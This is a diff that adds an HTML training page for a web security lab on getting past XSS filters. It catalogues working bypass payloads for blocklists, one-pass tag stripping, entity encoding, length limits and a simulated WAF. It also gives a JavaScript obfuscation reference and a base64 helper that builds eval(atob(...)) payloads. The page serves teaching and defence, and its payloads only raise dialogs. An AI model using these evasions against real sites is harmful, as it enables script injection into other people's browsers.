@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Module 12 — Attack Demo: Filter Evasion & Obfuscation</title>
+<style>
+  :root{--bg:#0b0f1a;--panel:#141c2e;--border:#1e3a5f;--text:#e2e8f0;--muted:#7a9bbf;--accent:#38bdf8;--warn:#f5c842;--danger:#f87171;--ok:#4ade80;--orange:#fb923c}
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;padding:24px;max-width:900px}
+  h1{font-size:20px;font-weight:700;color:var(--accent);margin-bottom:4px}
+  .subtitle{color:var(--muted);font-size:13px;margin-bottom:28px}
+  .step{background:var(--panel);border:1px solid var(--border);border-radius:8px;margin-bottom:20px;overflow:hidden}
+  .step-head{padding:14px 18px;display:flex;align-items:center;gap:12px;cursor:pointer;user-select:none}
+  .step-num{background:#1e3a5f;color:var(--accent);font-size:11px;font-weight:700;padding:3px 8px;border-radius:4px;flex-shrink:0}
+  .step-title{font-weight:600;font-size:14px;flex:1}
+  .step-tag{font-size:11px;padding:2px 8px;border-radius:3px}
+  .step-body{padding:18px;border-top:1px solid var(--border);display:none}
+  .step-body.open{display:block}
+  .concept{background:#060d1a;border-left:3px solid var(--accent);padding:10px 14px;border-radius:0 4px 4px 0;font-size:13px;color:var(--muted);margin-bottom:14px;line-height:1.6}
+  .concept strong{color:var(--text)}
+  code{font-family:'Courier New',monospace;font-size:12px;background:#060d1a;color:var(--accent);padding:2px 6px;border-radius:3px}
+  pre{background:#060d1a;border:1px solid var(--border);border-radius:5px;padding:12px 14px;overflow-x:auto;font-size:12px;line-height:1.6;color:var(--orange);margin:10px 0;white-space:pre-wrap}
+  .label{font-size:11px;color:var(--muted);margin-bottom:4px;font-weight:600;text-transform:uppercase;letter-spacing:.05em}
+  .row{display:flex;gap:10px;align-items:flex-start;flex-wrap:wrap;margin-bottom:10px}
+  input[type=text]{background:#060d1a;color:var(--text);border:1px solid var(--border);border-radius:4px;padding:8px 10px;font-size:13px;width:100%}
+  button{padding:8px 18px;border-radius:4px;border:1px solid var(--accent);background:#1e3a5f;color:var(--accent);font-size:13px;font-weight:600;cursor:pointer;white-space:nowrap}
+  button:hover{background:#2a4d7a}
+  .result{margin-top:10px;background:#060d1a;border:1px solid var(--border);border-radius:4px;padding:10px;font-size:12px;min-height:36px;color:var(--muted);white-space:pre-wrap;font-family:'Courier New',monospace;overflow-x:auto}
+  hr{border:none;border-top:1px solid var(--border);margin:14px 0}
+  table{width:100%;border-collapse:collapse;font-size:12px;margin:10px 0}
+  th{padding:6px 10px;background:#060d1a;color:var(--accent);text-align:left;font-size:11px}
+  td{padding:5px 10px;border-top:1px solid var(--border);color:var(--muted);word-break:break-all}
+  td strong{color:var(--text)}
+  .tag-evade{background:rgba(251,146,60,.12);color:var(--orange);border:1px solid rgba(251,146,60,.3)}
+  .tag-enc{background:rgba(167,139,250,.12);color:#a78bfa;border:1px solid rgba(167,139,250,.3)}
+  .tag-waf{background:rgba(248,113,113,.12);color:var(--danger);border:1px solid rgba(248,113,113,.3)}
+  .tag-ref{background:rgba(56,189,248,.12);color:var(--accent);border:1px solid rgba(56,189,248,.3)}
+  a{color:var(--accent)}
+</style>
+</head>
+<body>
+
+<h1>Attack Demo 08 — Filter Evasion & Obfuscation</h1>
+<p class="subtitle">Module 12 · Every filter has an edge. Learn to find it systematically.</p>
+
+<!-- ─── STEP 1 ─────────────────────────────────────────────────────────────── -->
+<div class="step">
+  <div class="step-head" onclick="toggle(this)">
+    <span class="step-num">01</span>
+    <span class="step-title">Keyword blocklist evasion — the incomplete list problem</span>
+    <span class="step-tag tag-evade">BLOCKLIST</span>
+  </div>
+  <div class="step-body open">
+    <div class="concept">
+      <strong>The blocklist trap:</strong> a developer blocks <code>script</code>, <code>alert</code>, <code>onerror</code>, <code>onload</code>, <code>javascript</code>. This sounds comprehensive. HTML has 170+ event handlers. The blocklist can never be complete.
+    </div>
+    <div class="label">Bypasses for /filter/blocklist</div>
+    <table>
+      <tr><th>Bypass payload</th><th>Why it works</th></tr>
+      <tr><td><code>&lt;img src=x onfocus=confirm(1) autofocus&gt;</code></td><td>onfocus not on blocklist; confirm not alert</td></tr>
+      <tr><td><code>&lt;svg onmouseover=confirm(1)&gt;hover me&lt;/svg&gt;</code></td><td>onmouseover not blocked</td></tr>
+      <tr><td><code>&lt;details open ontoggle=confirm(1)&gt;</code></td><td>ontoggle fires zero-interaction</td></tr>
+      <tr><td><code>&lt;img src=x onerROR=confirm(1)&gt;</code></td><td>Mixed case — blocklist is case-sensitive</td></tr>
+      <tr><td><code>&lt;body onpageshow=confirm(1)&gt;</code></td><td>onpageshow not on blocklist</td></tr>
+    </table>
+    <div class="label">Try a bypass</div>
+    <input type="text" id="s1-payload" value="<details open ontoggle=confirm(1)>">
+    <div class="row">
+      <button onclick="openFilter('blocklist', document.getElementById('s1-payload').value)">Test on /filter/blocklist</button>
+    </div>
+    <div class="concept" style="margin-top:10px">
+      <strong>Defender lesson:</strong> blocklists are the wrong model. An allowlist of safe HTML elements and attributes (via a sanitiser library) is the only viable approach.
+    </div>
+  </div>
+</div>
+
+<!-- ─── STEP 2 ─────────────────────────────────────────────────────────────── -->
+<div class="step">
+  <div class="step-head" onclick="toggle(this)">
+    <span class="step-num">02</span>
+    <span class="step-title">Script tag stripping — nested tag bypass</span>
+    <span class="step-tag tag-evade">STRIPPING</span>
+  </div>
+  <div class="step-body">
+    <div class="concept">
+      <strong>The stripping trap:</strong> <code>re.sub(r'&lt;script.*?&gt;.*?&lt;/script&gt;', '', input)</code> strips script tags. One pass. This is recoverable by the attacker because the regex is applied once to the input — the attacker's payload is reconstructed after stripping.
+    </div>
+    <div class="label">The nested tag bypass — payload reconstructed after stripping</div>
+    <pre>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;
+                 ↓ after one-pass strip of &lt;script&gt;…&lt;/script&gt;
+&lt;script&gt;alert(1)&lt;/script&gt;</pre>
+    <div class="label">Test it</div>
+    <input type="text" id="s2-payload" value="<scr<script>ipt>alert(1)</scr</script>ipt>">
+    <button onclick="openFilter('stripping', document.getElementById('s2-payload').value)">Test on /filter/stripping</button>
+    <hr>
+    <div class="concept">
+      <strong>Alternate bypasses (no script needed):</strong><br>
+      The filter only removes script tags — all other XSS vectors are untouched.
+    </div>
+    <input type="text" id="s2b" value="<img src=x onerror=alert(1)>">
+    <button onclick="openFilter('stripping', document.getElementById('s2b').value)">Test img vector</button>
+  </div>
+</div>
+
+<!-- ─── STEP 3 ─────────────────────────────────────────────────────────────── -->
+<div class="step">
+  <div class="step-head" onclick="toggle(this)">
+    <span class="step-num">03</span>
+    <span class="step-title">Case variation & character splitting</span>
+    <span class="step-tag tag-evade">CASE EVASION</span>
+  </div>
+  <div class="step-body">
+    <div class="concept">
+      Even case-insensitive filters block specific keyword strings. The attacker bypasses by:
+      <ul style="margin:8px 0 0 18px;line-height:1.8">
+        <li>Using a different function: <code>confirm(1)</code>, <code>prompt(1)</code>, <code>console.log(1)</code></li>
+        <li>Using event handlers that don't contain blocked keywords</li>
+        <li>Encoding the payload so the filter sees encoded text but the browser decodes and executes</li>
+      </ul>
+    </div>
+    <div class="label">Bypasses for /filter/case (blocks 'script' and 'alert' case-insensitively)</div>
+    <table>
+      <tr><th>Payload</th><th>Bypass technique</th></tr>
+      <tr><td><code>&lt;img src=x onerror=confirm(1)&gt;</code></td><td>confirm() not blocked</td></tr>
+      <tr><td><code>&lt;img src=x onerror=prompt(1)&gt;</code></td><td>prompt() not blocked</td></tr>
+      <tr><td><code>&lt;svg onload=eval(atob('YWxlcnQoMSk='))&gt;</code></td><td>Base64 of alert(1) — filter sees atob string, not 'alert'</td></tr>
+      <tr><td><code>&lt;img src=x onerror="window['al'+'ert'](1)"&gt;</code></td><td>String concatenation — 'al'+'ert' is not 'alert' at filter time</td></tr>
+    </table>
+    <input type="text" id="s3-payload" value="<img src=x onerror=confirm(1)>">
+    <button onclick="openFilter('case', document.getElementById('s3-payload').value)">Test on /filter/case</button>
+  </div>
+</div>
+
+<!-- ─── STEP 4 ─────────────────────────────────────────────────────────────── -->
+<div class="step">
+  <div class="step-head" onclick="toggle(this)">
+    <span class="step-num">04</span>
+    <span class="step-title">Encoding bypass — HTML entities & character references</span>
+    <span class="step-tag tag-enc">ENCODING</span>
+  </div>
+  <div class="step-body">
+    <div class="concept">
+      <strong>The encoding bypass:</strong> a filter that blocks raw <code>&lt;</code> and <code>&gt;</code> does not block their HTML entity equivalents: <code>&amp;lt;</code> and <code>&amp;gt;</code>. The browser's HTML parser decodes entities <em>after</em> the filter runs. So the filter sees clean text; the browser sees markup.
+    </div>
+    <div class="label">Entity forms that bypass raw angle-bracket filters</div>
+    <table>
+      <tr><th>Entity / encoding</th><th>Decoded value</th><th>Context where it works</th></tr>
+      <tr><td><code>&amp;lt;</code> / <code>&amp;gt;</code></td><td>&lt; / &gt;</td><td>HTML entity — decoded in HTML context</td></tr>
+      <tr><td><code>&amp;#60;</code> / <code>&amp;#62;</code></td><td>&lt; / &gt;</td><td>Decimal character reference</td></tr>
+      <tr><td><code>&amp;#x3C;</code> / <code>&amp;#x3E;</code></td><td>&lt; / &gt;</td><td>Hex character reference</td></tr>
+      <tr><td><code>%3C</code> / <code>%3E</code></td><td>&lt; / &gt;</td><td>URL encoding — decoded by server before filter if filter runs on decoded input</td></tr>
+    </table>
+    <div class="concept">
+      The /filter/encoding endpoint blocks literal &lt; and &gt; but renders the output as HTML — so <code>&amp;lt;img src=x onerror=alert(1)&amp;gt;</code> passes the filter and fires in the browser.
+    </div>
+    <div class="label">Test encoding bypass</div>
+    <input type="text" id="s4-payload" value="&lt;img src=x onerror=alert(1)&gt;">
+    <button onclick="openFilter('encoding', document.getElementById('s4-payload').value)">Test on /filter/encoding</button>
+    <div class="concept" style="margin-top:10px">
+      <strong>Note:</strong> This specific bypass only works when the filter inspects the raw input string but renders the output as HTML without re-encoding. If the filter HTML-encodes its output, the entity is double-encoded and renders as text, not markup.
+    </div>
+  </div>
+</div>
+
+<!-- ─── STEP 5 ─────────────────────────────────────────────────────────────── -->
+<div class="step">
+  <div class="step-head" onclick="toggle(this)">
+    <span class="step-num">05</span>
+    <span class="step-title">Length limit bypass — short payloads</span>
+    <span class="step-tag tag-evade">LENGTH</span>
+  </div>
+  <div class="step-body">
+    <div class="concept">
+      Length limits are a common secondary defence ("no one can fit an XSS payload in 30 chars"). Attackers find the shortest valid payload for the context.
+    </div>
+    <div class="label">Short payload catalogue — all ≤ 30 characters</div>
+    <table>
+      <tr><th>Payload</th><th>Length</th><th>Notes</th></tr>
+      <tr><td><code>&lt;svg onload=alert(1)&gt;</code></td><td>22</td><td>SVG zero-interaction</td></tr>
+      <tr><td><code>&lt;img src=x onerror=1&gt;</code></td><td>22</td><td>onerror with expression (1 evaluates, no dialog)</td></tr>
+      <tr><td><code>"&gt;&lt;svg onload=alert(1)&gt;</code></td><td>26</td><td>Attribute breakout + SVG</td></tr>
+      <tr><td><code>'&gt;&lt;svg onload=alert`1`&gt;</code></td><td>27</td><td>Template literal — avoids parens</td></tr>
+      <tr><td><code>&lt;svg/onload=alert(1)&gt;</code></td><td>22</td><td>Slash replaces space</td></tr>
+      <tr><td><code>&lt;q oncut=alert(1)&gt;X</code></td><td>20</td><td>oncut on q element (interaction needed)</td></tr>
+    </table>
+    <input type="text" id="s5-payload" value="<svg onload=alert(1)>">
+    <span id="s5-len" style="color:var(--muted);font-size:12px">22 chars</span>
+    <button onclick="openFilter('length', document.getElementById('s5-payload').value)" style="margin-top:8px">Test on /filter/length (limit: 30)</button>
+    <script>
+      document.getElementById('s5-payload').addEventListener('input', function() {
+        document.getElementById('s5-len').textContent = this.value.length + ' chars';
+      });
+    </script>
+  </div>
+</div>
+
+<!-- ─── STEP 6 ─────────────────────────────────────────────────────────────── -->
+<div class="step">
+  <div class="step-head" onclick="toggle(this)">
+    <span class="step-num">06</span>
+    <span class="step-title">WAF bypass — rule ordering and interaction</span>
+    <span class="step-tag tag-waf">WAF SIM</span>
+  </div>
+  <div class="step-body">
+    <div class="concept">
+      WAFs apply rules in sequence. Each rule operates on the output of the previous rule. This creates opportunities: a payload that is harmless after rule N-1 can be reconstructed by rule N's transformations.
+    </div>
+    <div class="label">WAF rule order: strip &lt;script&gt; → block 'alert' → block 'javascript:'</div>
+    <div class="concept">
+      <strong>The WAF sim's weakness:</strong> Rule 2 blocks 'alert' but only as a plain string replacement. It runs <em>after</em> Rule 1 has already stripped &lt;script&gt; tags. So an img onerror payload carrying <code>confirm()</code> instead of <code>alert()</code> bypasses all three rules.
+    </div>
+    <div class="label">WAF bypasses — test each in sequence</div>
+    <table>
+      <tr><th>Payload</th><th>Rules bypassed</th><th>Why</th></tr>
+      <tr><td><code>&lt;img src=x onerror=confirm(1)&gt;</code></td><td>R1, R2, R3</td><td>No script tag, no 'alert', no javascript:</td></tr>
+      <tr><td><code>&lt;img src=x onerror=window['al'+'ert'](1)&gt;</code></td><td>R2</td><td>'al'+'ert' ≠ 'alert' at filter time</td></tr>
+      <tr><td><code>&lt;img src=x onerror=eval(atob('YWxlcnQoMSk='))&gt;</code></td><td>R2</td><td>alert(1) is base64-encoded — filter sees atob string</td></tr>
+      <tr><td><code>&lt;a href="java&#x09;script:alert(1)"&gt;click&lt;/a&gt;</code></td><td>R3</td><td>Tab char between java and script breaks R3's regex</td></tr>
+    </table>
+    <input type="text" id="s6-payload" value="<img src=x onerror=confirm(1)>">
+    <button onclick="openWAF(document.getElementById('s6-payload').value)">Test on /waf-sim</button>
+  </div>
+</div>
+
+<!-- ─── STEP 7 ─────────────────────────────────────────────────────────────── -->
+<div class="step">
+  <div class="step-head" onclick="toggle(this)">
+    <span class="step-num">07</span>
+    <span class="step-title">JavaScript obfuscation techniques reference</span>
+    <span class="step-tag tag-ref">REFERENCE</span>
+  </div>
+  <div class="step-body">
+    <div class="concept">
+      Once inside a JavaScript execution context (inside an event handler, inside a script tag), the attacker can obfuscate the JavaScript itself to evade pattern-matching defences on the JS content.
+    </div>
+    <table>
+      <tr><th>Technique</th><th>Example</th><th>Notes</th></tr>
+      <tr><td><strong>String concatenation</strong></td><td><code>'al'+'ert'</code></td><td>Reassembled at runtime</td></tr>
+      <tr><td><strong>Base64 + eval/atob</strong></td><td><code>eval(atob('YWxlcnQoMSk='))</code></td><td>Filter-transparent encoding</td></tr>
+      <tr><td><strong>Template literals</strong></td><td><code>alert`1`</code></td><td>No parentheses — bypasses <code>()</code> filters</td></tr>
+      <tr><td><strong>Unicode escape</strong></td><td><code>alert(1)</code></td><td>JS engine decodes unicode before execution</td></tr>
+      <tr><td><strong>Hex escape</strong></td><td><code>\x61\x6c\x65\x72\x74(1)</code></td><td>Same as unicode but hex form</td></tr>
+      <tr><td><strong>Property access</strong></td><td><code>window['alert'](1)</code></td><td>Avoids bare <code>alert</code> identifier</td></tr>
+      <tr><td><strong>Constructor chain</strong></td><td><code>[]['constructor']['constructor']('alert(1)')()</code></td><td>Builds Function constructor from Array</td></tr>
+      <tr><td><strong>fromCharCode</strong></td><td><code>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</code></td><td>Char codes for alert(1)</td></tr>
+      <tr><td><strong>JSFuck / Hieroglyphy</strong></td><td><code>[][(![]+[])[+[]]…</code></td><td>Only 6 chars: <code>[]()!+</code></td></tr>
+      <tr><td><strong>HTML entity in attributes</strong></td><td><code>onerror="&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)"</code></td><td>Entities decoded by HTML parser before JS executes</td></tr>
+    </table>
+    <div class="label">Encode a string to base64 for payload crafting</div>
+    <div class="row">
+      <input type="text" id="b64-in" value="alert(1)" style="flex:1">
+      <button onclick="encodeB64()">Base64 encode</button>
+    </div>
+    <div id="b64-out" class="result" style="min-height:28px"></div>
+    <div class="label" style="margin-top:10px">Decode base64</div>
+    <div class="row">
+      <input type="text" id="b64-dec-in" style="flex:1" placeholder="YWxlcnQoMSk=">
+      <button onclick="decodeB64()">Decode</button>
+    </div>
+    <div id="b64-dec-out" class="result" style="min-height:28px"></div>
+  </div>
+</div>
+
+<script>
+function toggle(head) {
+  head.nextElementSibling.classList.toggle("open");
+}
+
+function openFilter(name, payload) {
+  window.open("/filter/" + name + "?q=" + encodeURIComponent(payload), "_blank");
+}
+
+function openWAF(payload) {
+  window.open("/waf-sim?q=" + encodeURIComponent(payload), "_blank");
+}
+
+function encodeB64() {
+  try {
+    const out = btoa(unescape(encodeURIComponent(document.getElementById('b64-in').value)));
+    document.getElementById('b64-out').textContent =
+      out + "\n\nPayload: eval(atob('" + out + "'))";
+  } catch(e) { document.getElementById('b64-out').textContent = "Error: "+e; }
+}
+
+function decodeB64() {
+  try {
+    const out = decodeURIComponent(escape(atob(document.getElementById('b64-dec-in').value)));
+    document.getElementById('b64-dec-out').textContent = out;
+  } catch(e) { document.getElementById('b64-dec-out').textContent = "Error: "+e; }
+}
+</script>
+</body>
+</html>
